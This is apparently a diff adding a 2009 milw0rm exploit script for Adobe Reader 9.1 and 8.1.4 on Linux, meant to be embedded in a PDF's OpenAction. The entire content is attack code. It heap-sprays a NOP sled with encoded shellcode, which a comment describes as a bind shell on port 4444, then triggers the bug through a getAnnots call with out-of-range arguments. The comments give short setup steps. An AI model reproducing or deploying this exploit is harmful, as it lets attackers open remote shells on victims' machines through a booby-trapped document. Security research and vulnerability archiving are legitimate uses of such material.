@@ -1,0 +1,39 @@
+//##############
+//Exploit made by Arr1val
+//Proved in adobe 9.1 and adobe 8.1.4 on linux
+//
+//Steps:
+//- create a pdf with an annotation (a note) (i used an annotation with a very long AAAAA name, but that might be omitted)
+//- attach the following script to the OpenAction of the pdf.
+//##############
+
+var memory;
+function New_Script()
+{
+
+//if(adobe9)//adobe reader 8 works also with app.setTimeOut?
+var startwith = app.alert('Hi');//required for adobe9
+
+    var nop = unescape("%u9090%u9090"); //long nop will also force the address to go to 0x90909090 so 2 steps in one ;)
+    var shellcode = unescape( "%uc92b%ue983%ud9eb%ud9ee%u2474%u5bf4%u7381%u1313%u2989%u8357%ufceb%uf4e2%u5222%u147a%ue340%u3d2b%ud175%udeb0%u44f2%uc1a9%udb50%u3f4f%ud502%u044f%u689a%u3143%ud94b%u0178%u689a%ud7e4%uefa3%ub4f8%u09de%u057b%uca45%ub6a0%uefa3%ud7e4%ue380%u0e2b%ub6a3%ud7e4%uf05a%ue7d0%udb18%u7841%ufa3c%u3f41%ueb3c%u3940%u6a9a%u047b%u689a%ud7e4"); //linux bind shell at port 4444
+
+    while(nop.length <= 0x100000/2) nop+=nop;
+    nop=nop.substring(0,0x100000/2 - shellcode.length);
+
+    memory=new Array();
+    for(i=0;i<0x6ff;i++)  //we should at least overwrite 0x90909090
+    {memory[i]=nop + shellcode;}
+
+//start exploit now
+start();
+
+function start()
+{
+    this.getAnnots(-134217728,-134217728,-134217728,-134217728);
+}
+
+}
+
+//############################
+
+# milw0rm.com [2009-04-29]
